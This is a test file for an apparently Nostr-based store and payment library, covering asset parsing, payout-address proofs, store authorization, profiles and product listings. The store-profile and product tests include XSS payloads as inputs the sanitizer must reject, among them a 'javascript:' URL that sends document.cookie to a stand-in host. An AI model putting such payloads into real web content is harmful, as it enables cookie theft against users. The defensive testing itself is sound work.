import { PATHUSD_TEMPO, USDC_SOLANA_DEVNET } from '@elisym/pay-core';
import { describe, expect, it } from 'vitest';
import { hasValidEvmChecksum, parseCaip19 } from '../src/caip';
import { KIND_PAYTO, KIND_PRODUCT, KIND_STORE_AUTH } from '../src/constants';
import { buildPaytoEvent, parsePayto } from '../src/events/payto';
import {
  buildProductEvent,
  decodeProductNaddr,
  encodeProductNaddr,
  isPurchasable,
  parseProduct,
  priceInSubunits,
  productAddress,
} from '../src/events/product';
import {
  buildStoreAuthEvent,
  buildStoreRevocationEvent,
  readStoreAuth,
} from '../src/events/store-auth';
import { buildStoreProfileEvent, parseStoreProfile } from '../src/events/store-profile';
import {
  EVM_VECTOR,
  USDCE_TEMPO_CAIP19,
  USDC_DEVNET_CAIP19,
  nostrKey,
  sign,
  solanaWallet,
} from './fixtures';

describe('parseCaip19', () => {
  it('reads a registry coin on a registry chain', () => {
    const parsed = parseCaip19(USDC_DEVNET_CAIP19);
    expect(parsed?.chain.network).toBe('devnet');
    expect(parsed?.asset.mint).toBe(USDC_SOLANA_DEVNET.mint);
  });

  it('refuses the right mint under the wrong environment', () => {
    // Devnet USDC's mint named under the mainnet chain id is no coin there.
    expect(
      parseCaip19(`solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp/token:${USDC_SOLANA_DEVNET.mint}`),
    ).toBeUndefined();
  });

  it('refuses a namespace that does not fit the chain, and an unknown chain', () => {
    expect(
      parseCaip19(`solana:EtWTRABZaYq6iMfeYKouRu166VU2xqa1/erc20:${USDC_SOLANA_DEVNET.mint}`),
    ).toBeUndefined();
    expect(parseCaip19(`eip155:1/erc20:${PATHUSD_TEMPO.mint}`)).toBeUndefined();
    expect(
      parseCaip19('eip155:4217/erc20:0x20C000000000000000000000B9537D11C60E8B50'),
    ).toBeUndefined();
    expect(parseCaip19('nonsense')).toBeUndefined();
  });
});

describe('kind 10133 payout addresses', () => {
  it('round-trips signed Solana and EVM targets', () => {
    const owner = nostrKey();
    const wallet = solanaWallet();
    const event = sign(
      buildPaytoEvent({
        payto: [{ type: 'solana', authority: wallet.address }],
        ownerPubkey: owner.pubkey,
        accept: [
          {
            caip19: USDC_DEVNET_CAIP19,
            address: wallet.address,
            signature: wallet.proveFor(owner.pubkey, USDC_DEVNET_CAIP19),
          },
        ],
      }),
      owner,
    );
    expect(event.kind).toBe(KIND_PAYTO);
    expect(event.tags[0]).toEqual(['payto', 'solana', wallet.address]);
    const parsed = parsePayto(event);
    expect(parsed.rejected).toEqual([]);
    expect(parsed.targets).toHaveLength(1);
    expect(parsed.targets[0]?.address).toBe(wallet.address);
    expect(parsed.targets[0]?.walletSigned).toBe(true);
  });

  it('verifies the EVM proof against the event author', () => {
    const parsed = parsePayto({
      pubkey: EVM_VECTOR.owner,
      tags: [['accept', USDCE_TEMPO_CAIP19, EVM_VECTOR.address, EVM_VECTOR.signature]],
    });
    expect(parsed.targets[0]?.walletSigned).toBe(true);

    const replayed = parsePayto({
      pubkey: 'b'.repeat(64),
      tags: [['accept', USDCE_TEMPO_CAIP19, EVM_VECTOR.address, EVM_VECTOR.signature]],
    });
    expect(replayed.targets).toEqual([]);
    expect(replayed.rejected[0]?.reason).toBe('bad_proof');
  });

  it('drops an address with a wrong proof in any copy, and counts a good proof in any copy', () => {
    const wallet = solanaWallet();
    const owner = 'a'.repeat(64);
    const good = wallet.proveFor(owner, USDC_DEVNET_CAIP19);
    const bad = wallet.proveFor('b'.repeat(64), USDC_DEVNET_CAIP19);
    const wrongThenBare = parsePayto({
      pubkey: owner,
      tags: [
        ['accept', USDC_DEVNET_CAIP19, wallet.address, bad],
        ['accept', USDC_DEVNET_CAIP19, wallet.address],
      ],
    });
    expect(wrongThenBare.targets).toEqual([]);
    const bareThenSigned = parsePayto({
      pubkey: owner,
      tags: [
        ['accept', USDC_DEVNET_CAIP19, wallet.address],
        ['accept', USDC_DEVNET_CAIP19, wallet.address, good],
      ],
    });
    expect(bareThenSigned.targets.map((target) => target.walletSigned)).toEqual([true]);
  });

  it('keeps an unsigned target, marked unsigned', () => {
    const wallet = solanaWallet();
    const parsed = parsePayto({
      pubkey: 'a'.repeat(64),
      tags: [['accept', USDC_DEVNET_CAIP19, wallet.address]],
    });
    expect(parsed.targets[0]?.walletSigned).toBe(false);
  });

  it('never pays a bare NIP-A3 payto tag', () => {
    const wallet = solanaWallet();
    const parsed = parsePayto({
      pubkey: 'a'.repeat(64),
      tags: [['payto', 'solana', wallet.address]],
    });
    expect(parsed.targets).toEqual([]);
  });

  it('drops unknown assets and malformed addresses', () => {
    const parsed = parsePayto({
      pubkey: 'a'.repeat(64),
      tags: [
        ['accept', 'solana:unknown/token:abc', 'x'],
        ['accept', USDC_DEVNET_CAIP19, '0xnot-solana'],
        // The zero key and the zero address: nobody can spend what lands there.
        ['accept', USDC_DEVNET_CAIP19, '1'.repeat(32)],
        ['accept', USDCE_TEMPO_CAIP19, `0x${'0'.repeat(40)}`],
        // Base58 by alphabet and length, but not 32 bytes: 23 and 33.
        ['accept', USDC_DEVNET_CAIP19, '2'.repeat(32)],
        ['accept', USDC_DEVNET_CAIP19, 'z'.repeat(44)],
        ['accept', USDCE_TEMPO_CAIP19, `0x${'12'.repeat(4)}${'fd'.repeat(10)}${'00'.repeat(6)}`],
      ],
    });
    expect(parsed.targets).toEqual([]);
    expect(parsed.rejected.map((entry) => entry.reason)).toEqual([
      'unknown_asset',
      'bad_address',
      'bad_address',
      'bad_address',
      'bad_address',
      'bad_address',
      'bad_address',
    ]);
  });

  it('writes EVM addresses lowercase and refuses to build an unknown asset', () => {
    const template = buildPaytoEvent({
      accept: [
        {
          caip19: USDCE_TEMPO_CAIP19,
          address: EVM_VECTOR.address.toUpperCase().replace('0X', '0x'),
        },
      ],
    });
    expect(template.tags[0]?.[2]).toBe(EVM_VECTOR.address);
    // A mixed-case address must carry a valid EIP-55 checksum: one wrong letter case is a typo.
    const checksummed = '0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAed';
    const mistyped = '0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAeD';
    expect(hasValidEvmChecksum(checksummed)).toBe(true);
    expect(hasValidEvmChecksum(mistyped)).toBe(false);
    expect(() =>
      buildPaytoEvent({ accept: [{ caip19: USDCE_TEMPO_CAIP19, address: mistyped }] }),
    ).toThrow(/checksum/);
  });

  it('refuses to build a wallet signature its readers would drop', () => {
    const owner = 'a'.repeat(64);
    const wallet = solanaWallet();
    const accept = (signature: string) => [
      { caip19: USDC_DEVNET_CAIP19, address: wallet.address, signature },
    ];
    const good = wallet.proveFor(owner, USDC_DEVNET_CAIP19);
    expect(() => buildPaytoEvent({ accept: accept(good) })).toThrow(/ownerPubkey/);
    const upper = owner.toUpperCase();
    const upperProof = wallet.proveFor(upper, USDC_DEVNET_CAIP19);
    expect(() =>
      buildPaytoEvent({
        ownerPubkey: upper,
        accept: [{ caip19: USDC_DEVNET_CAIP19, address: wallet.address, signature: upperProof }],
      }),
    ).toThrow(/ownerPubkey/);
    expect(() => buildPaytoEvent({ ownerPubkey: 'b'.repeat(64), accept: accept(good) })).toThrow(
      /does not prove/,
    );
    expect(buildPaytoEvent({ ownerPubkey: owner, accept: accept(good) }).tags[0]?.[3]).toBe(good);
    expect(() => buildPaytoEvent({ accept: [{ caip19: 'x:y/token:z', address: 'a' }] })).toThrow();
  });
});

describe('store authorization', () => {
  const store = 'e'.repeat(64);

  it('is active until it expires', () => {
    const event = buildStoreAuthEvent({
      storePubkey: store,
      mode: 'hosted',
      operator: 'elisym.network',
      expiresAt: 2_000,
    });
    expect(event.kind).toBe(KIND_STORE_AUTH);
    expect(readStoreAuth(event, store, 1_000)).toEqual({
      status: 'active',
      mode: 'hosted',
      operator: 'elisym.network',
    });
    expect(readStoreAuth(event, store, 2_000)).toEqual({ status: 'expired' });
  });

  it('refuses to build an expiration its reader would call malformed', () => {
    for (const expiresAt of [1_798_761_600_000, 1_798_761_600.5, 0, -1]) {
      expect(() =>
        buildStoreAuthEvent({ storePubkey: store, mode: 'self-host', expiresAt }),
      ).toThrow();
    }
  });

  it('is malformed with two modes or two expirations', () => {
    const base = [
      ['d', store],
      ['p', store],
    ];
    const read = (extra: string[][]) =>
      readStoreAuth({ kind: KIND_STORE_AUTH, tags: [...base, ...extra] }, store, 1_000);
    expect(
      read([
        ['mode', 'hosted'],
        ['mode', 'revoked'],
      ]),
    ).toEqual({ status: 'malformed' });
    expect(
      read([
        ['mode', 'self-host'],
        ['expiration', '2000'],
        ['expiration', '500'],
      ]),
    ).toEqual({ status: 'malformed' });
    // An expiration tag with no value is not "never expires".
    expect(read([['mode', 'self-host'], ['expiration']])).toEqual({ status: 'malformed' });
  });

  it('refuses to build a mode other than self-host or hosted', () => {
    for (const mode of ['revoked', 'Hosted']) {
      expect(() =>
        buildStoreAuthEvent(JSON.parse(JSON.stringify({ storePubkey: store, mode }))),
      ).toThrow(/Invalid store mode/);
    }
  });

  it('reads a revocation', () => {
    expect(readStoreAuth(buildStoreRevocationEvent(store), store)).toEqual({ status: 'revoked' });
  });

  it('is malformed for another store, an unknown mode, or a bad expiration', () => {
    const event = buildStoreAuthEvent({ storePubkey: store, mode: 'self-host' });
    expect(readStoreAuth(event, 'f'.repeat(64))).toEqual({ status: 'malformed' });
    expect(
      readStoreAuth(
        {
          kind: KIND_STORE_AUTH,
          tags: [
            ['d', store],
            ['p', store],
            ['mode', 'x'],
          ],
        },
        store,
      ),
    ).toEqual({ status: 'malformed' });
    expect(
      readStoreAuth(
        {
          kind: KIND_STORE_AUTH,
          tags: [
            ['d', store],
            ['p', store],
            ['mode', 'self-host'],
            ['expiration', 'soon'],
          ],
        },
        store,
      ),
    ).toEqual({ status: 'malformed' });
    // `d` right but `p` pointing elsewhere: not a statement about this store.
    expect(
      readStoreAuth(
        {
          kind: KIND_STORE_AUTH,
          tags: [
            ['d', store],
            ['p', 'f'.repeat(64)],
            ['mode', 'self-host'],
          ],
        },
        store,
      ),
    ).toEqual({ status: 'malformed' });
  });
});

describe('store profile', () => {
  it('round-trips and carries the owner tag', () => {
    const owner = 'a'.repeat(64);
    const event = buildStoreProfileEvent({
      name: 'Shop',
      nip05: '_@shop.example',
      ownerPubkey: owner,
    });
    expect(parseStoreProfile(event)).toEqual({
      name: 'Shop',
      nip05: '_@shop.example',
      ownerPubkey: owner,
    });
  });

  it('keeps picture and website only as https URLs', () => {
    expect(
      parseStoreProfile({
        content: JSON.stringify({
          website: "javascript:fetch('//x/'+document.cookie)",
          picture: 'data:image/svg+xml,<svg/>',
        }),
        tags: [],
      }),
    ).toEqual({});
    expect(
      parseStoreProfile({
        content: JSON.stringify({
          website: 'https://shop.example',
          picture: 'https://shop.example/logo.png',
        }),
        tags: [],
      }),
    ).toEqual({ website: 'https://shop.example', picture: 'https://shop.example/logo.png' });
  });

  it('refuses to build a field its own reader would drop', () => {
    const base = { ownerPubkey: 'a'.repeat(64) };
    expect(() => buildStoreProfileEvent({ ...base, website: 'http://shop.example' })).toThrow();
    expect(() => buildStoreProfileEvent({ ...base, picture: 'HTTPS://x.example/a.png' })).toThrow();
    expect(() => buildStoreProfileEvent({ ...base, name: 'x'.repeat(2000) })).toThrow();
  });

  it('drops one odd field, not the whole profile', () => {
    expect(
      parseStoreProfile({
        content: JSON.stringify({ name: 'S', picture: null, about: 42, website: 'x'.repeat(2000) }),
        tags: [],
      }),
    ).toEqual({ name: 'S' });
  });

  it('is undefined for content that is not a profile, and ignores a malformed owner', () => {
    expect(parseStoreProfile({ content: 'nope', tags: [] })).toBeUndefined();
    expect(parseStoreProfile({ content: '[]', tags: [] })).toBeUndefined();
    expect(parseStoreProfile({ content: '{}', tags: [['owner', 'XYZ']] })).toEqual({});
  });
});

describe('product listing', () => {
  const input = {
    d: 'course-101',
    title: 'Agents 101',
    summary: 'Video course',
    description: 'Twelve lessons.',
    price: { amount: '49', currency: 'USD' },
    images: ['https://shop.example/c.png'],
    topics: ['course'],
    delivery: 'access' as const,
    listedOnElisym: true,
    endpoints: [{ type: 'x402' as const, url: 'https://pay.example/402/x' }],
    accept: [USDC_DEVNET_CAIP19],
  };

  it('round-trips a listing', () => {
    const store = nostrKey();
    const event = sign(buildProductEvent(input), store);
    expect(event.kind).toBe(KIND_PRODUCT);
    const product = parseProduct(event);
    expect(product).toMatchObject({
      storePubkey: store.pubkey,
      d: 'course-101',
      title: 'Agents 101',
      summary: 'Video course',
      description: 'Twelve lessons.',
      price: { amount: '49', currency: 'USD' },
      topics: ['course'],
      visibility: 'on-sale',
      delivery: 'access',
      listedOnElisym: true,
      accept: [USDC_DEVNET_CAIP19],
    });
    expect(product && isPurchasable(product)).toBe(true);
    expect(product && productAddress(product)).toBe(`30402:${store.pubkey}:course-101`);
  });

  it('takes only https images, when building and when reading', () => {
    expect(() => buildProductEvent({ ...input, images: ['javascript:alert(1)'] })).toThrow();
    const product = parseProduct({
      kind: KIND_PRODUCT,
      pubkey: 'a'.repeat(64),
      created_at: 1,
      content: '',
      tags: [
        ['d', 'x'],
        ['title', 'T'],
        ['price', '1', 'USD'],
        ['image', 'javascript:alert(1)'],
        ['image', 'data:image/png;base64,AAAA'],
        ['image', 'https://shop.example/a.png'],
      ],
    });
    expect(product?.images).toEqual(['https://shop.example/a.png']);
  });

  it('reads a plain NIP-99 listing from another client', () => {
    const product = parseProduct({
      kind: KIND_PRODUCT,
      pubkey: 'a'.repeat(64),
      created_at: 1,
      content: 'x',
      tags: [
        ['d', 'x'],
        ['title', 'T'],
        ['price', '10', 'EUR'],
      ],
    });
    expect(product?.accept).toEqual([]);
    expect(product?.listedOnElisym).toBe(false);
  });

  it('refuses a listing without a price, and a float-looking one', () => {
    const base = { kind: KIND_PRODUCT, pubkey: 'a'.repeat(64), created_at: 1, content: '' };
    expect(
      parseProduct({
        ...base,
        tags: [
          ['d', 'x'],
          ['title', 'T'],
        ],
      }),
    ).toBeUndefined();
    expect(
      parseProduct({
        ...base,
        tags: [
          ['d', 'x'],
          ['title', 'T'],
          ['price', '1e3', 'USD'],
        ],
      }),
    ).toBeUndefined();
  });

  it('refuses to build with an asset nothing can pay in', () => {
    expect(() => buildProductEvent({ ...input, accept: ['solana:x/token:y'] })).toThrow();
  });

  it('ignores endpoints that are not https', () => {
    const product = parseProduct({
      kind: KIND_PRODUCT,
      pubkey: 'a'.repeat(64),
      created_at: 1,
      content: '',
      tags: [
        ['d', 'x'],
        ['title', 'T'],
        ['price', '1', 'USD'],
        ['endpoint', 'x402', 'http://pay.example'],
      ],
    });
    expect(product?.endpoints).toEqual([]);
  });

  it('encodes and decodes an naddr, refusing other kinds', () => {
    const naddr = encodeProductNaddr({ storePubkey: 'a'.repeat(64), d: 'course-101' }, [
      'wss://r.example',
    ]);
    expect(decodeProductNaddr(naddr)).toEqual({
      storePubkey: 'a'.repeat(64),
      d: 'course-101',
      relays: ['wss://r.example'],
    });
    expect(decodeProductNaddr('npub1xyz')).toBeUndefined();
  });

  it('prices USD 1:1 in USD coins and refuses anything that needs a quote', () => {
    expect(priceInSubunits({ amount: '49.5', currency: 'USD' }, USDC_SOLANA_DEVNET)).toBe(
      49_500_000n,
    );
    expect(priceInSubunits({ amount: '1', currency: 'USD' }, PATHUSD_TEMPO)).toBe(1_000_000n);
    expect(priceInSubunits({ amount: '49.0000000', currency: 'USD' }, USDC_SOLANA_DEVNET)).toBe(
      49_000_000n,
    );
    expect(() => priceInSubunits({ amount: '1', currency: 'EUR' }, USDC_SOLANA_DEVNET)).toThrow();
    expect(() =>
      priceInSubunits({ amount: '1', currency: 'USD', frequency: 'month' }, USDC_SOLANA_DEVNET),
    ).toThrow();
    expect(() =>
      priceInSubunits({ amount: '0.0000001', currency: 'USD' }, USDC_SOLANA_DEVNET),
    ).toThrow();
  });
});
